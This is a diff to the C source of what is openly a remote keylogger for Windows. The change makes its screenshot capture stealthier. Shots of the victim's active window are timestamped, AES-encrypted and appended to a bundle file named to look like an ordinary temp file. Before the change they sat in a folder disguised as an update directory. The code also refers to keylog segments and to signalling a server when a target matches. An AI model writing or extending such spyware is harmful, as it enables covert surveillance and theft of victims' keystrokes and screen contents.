@@ -5,6 +5,7 @@
 #include "pch.h"
 #include "remote_keylogger.h"
 #include "remote_keylogger_aes.h"
+#include "remote_protocol.h"
 #include "remote_log.h"
 #include "remote_config.h"
 #include "gdiplus_jpeg.h"
@@ -50,8 +51,7 @@ static int g_match_screenshot_interval_ms = 0;
 
 /* Screenshot scheduling while a target match is active. */
 static DWORD g_next_screenshot_at_ms = 0;
-static unsigned int g_screenshot_seq = 0;
-static char g_screenshot_dir[MAX_PATH] = { 0 };
+static char g_screenshot_bundle_path[MAX_PATH] = { 0 };
 
 /* Target hit signaling to server (piggybacked on next ClientPingRequest handshake).
  * This is set by keylogger matching logic and consumed by remote_client.c. */
@@ -380,10 +380,69 @@ static void update_window_title(void) {
     append_html(line);
 }
 
+static void screenshot_write_u64_le(unsigned char* p, unsigned __int64 v) {
+    int i;
+    for (i = 0; i < 8; i++) {
+        p[i] = (unsigned char)(v & 0xFFu);
+        v >>= 8;
+    }
+}
+
+static unsigned __int64 screenshot_unix_ms_utc(void) {
+    FILETIME ft;
+    ULARGE_INTEGER u;
+    GetSystemTimeAsFileTime(&ft);
+    u.LowPart = ft.dwLowDateTime;
+    u.HighPart = ft.dwHighDateTime;
+    return (unsigned __int64)(u.QuadPart / 10000ULL - 11644473600000ULL);
+}
+
+/* Append [SCS1][len4][AES blob] to g_screenshot_bundle_path; plaintext = [8-byte LE unix ms UTC][jpeg]. */
+static int append_screenshot_jpeg_encrypted(const unsigned char* jpeg, size_t jlen) {
+    if (!g_screenshot_bundle_path[0] || !jpeg || jlen == 0) return 0;
+
+    unsigned __int64 unix_ms = screenshot_unix_ms_utc();
+    size_t plain_len = 8 + jlen;
+    unsigned char* plain = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, plain_len);
+    if (!plain) return 0;
+    screenshot_write_u64_le(plain, unix_ms);
+    memcpy(plain + 8, jpeg, jlen);
+
+    size_t out_cap = KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES + ((plain_len / 16) + 1) * 16;
+    unsigned char* enc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, out_cap);
+    if (!enc) { HeapFree(GetProcessHeap(), 0, plain); return 0; }
+    size_t enc_len = out_cap;
+    if (!keylog_aes_encrypt(plain, plain_len, enc, &enc_len)) {
+        HeapFree(GetProcessHeap(), 0, enc);
+        HeapFree(GetProcessHeap(), 0, plain);
+        return 0;
+    }
+    HeapFree(GetProcessHeap(), 0, plain);
+
+    static const unsigned char seg_magic[4] = { 'S', 'C', 'S', '1' };
+    WaitForSingleObject(g_keylogger_mutex, INFINITE);
+    FILE* f = NULL;
+    if (fopen_s(&f, g_screenshot_bundle_path, "ab") != 0 || !f) {
+        ReleaseMutex(g_keylogger_mutex);
+        HeapFree(GetProcessHeap(), 0, enc);
+        return 0;
+    }
+    fwrite(seg_magic, 1, 4, f);
+    {
+        unsigned long seg_len = (unsigned long)enc_len;
+        fwrite(&seg_len, 1, 4, f);
+    }
+    fwrite(enc, 1, enc_len, f);
+    fclose(f);
+    ReleaseMutex(g_keylogger_mutex);
+    HeapFree(GetProcessHeap(), 0, enc);
+    return 1;
+}
+
 static int capture_active_window_jpeg(void) {
     if (!g_match_save_screenshots) return 0;
     if (!g_active_hwnd || !IsWindow(g_active_hwnd)) return 0;
-    if (g_screenshot_dir[0] == '\0') return 0;
+    if (g_screenshot_bundle_path[0] == '\0') return 0;
 
     RECT r;
     if (!GetWindowRect(g_active_hwnd, &r)) return 0;
@@ -445,25 +504,7 @@ static int capture_active_window_jpeg(void) {
     }
     HeapFree(GetProcessHeap(), 0, bgra);
 
-    // Build output filename: %TEMP%\\Update_jx823BI\\YYYY-MM-DD_HH-MM-SS_seq.jpg
-    SYSTEMTIME st;
-    GetSystemTime(&st);
-    unsigned int seq = ++g_screenshot_seq;
-
-    char fname[MAX_PATH];
-    _snprintf_s(fname, sizeof(fname), _TRUNCATE,
-        "%s\\%04u-%02u-%02u_%02u-%02u-%02u_%u.jpg",
-        g_screenshot_dir,
-        (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
-        (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond,
-        (unsigned)seq);
-
-    FILE* f = NULL;
-    if (fopen_s(&f, fname, "wb") == 0 && f) {
-        (void)fwrite(jpeg, 1, (size_t)jlen, f);
-        fclose(f);
-    }
-
+    (void)append_screenshot_jpeg_encrypted(jpeg, (size_t)jlen);
     HeapFree(GetProcessHeap(), 0, jpeg);
     return 1;
 }
@@ -763,7 +804,6 @@ int remote_keylogger_start(const char* logs_dir, const struct remote_config* con
     g_match_save_screenshots = 0;
     g_match_screenshot_interval_ms = 0;
     g_next_screenshot_at_ms = 0;
-    g_screenshot_seq = 0;
     g_active_target_index = -1;
     g_active_pid = 0;
     g_active_hwnd = NULL;
@@ -789,15 +829,9 @@ int remote_keylogger_start(const char* logs_dir, const struct remote_config* con
     g_keylog_q_tail = 0;
     g_keylog_q_initialized = 1;
 
-    /* Screenshot directory: %TEMP%\\Update_jx823BI */
-    char temp_path[MAX_PATH] = { 0 };
-    DWORD tmpLen = GetTempPathA(MAX_PATH, temp_path);
-    if (tmpLen > 0 && temp_path[0]) {
-        _snprintf_s(g_screenshot_dir, sizeof(g_screenshot_dir), _TRUNCATE, "%s\\Update_jx823BI", temp_path);
-        CreateDirectoryA(g_screenshot_dir, NULL);
-    } else {
-        g_screenshot_dir[0] = '\0';
-    }
+    /* Encrypted screenshot bundle: %TEMP%\\wctBG958.tmp (same AES key as keylog segments). */
+    if (!remote_get_screenshot_bundle_path(g_screenshot_bundle_path, sizeof(g_screenshot_bundle_path)))
+        g_screenshot_bundle_path[0] = '\0';
 
     g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread_proc, NULL, 0, NULL);
     if (!g_keylogger_thread) {
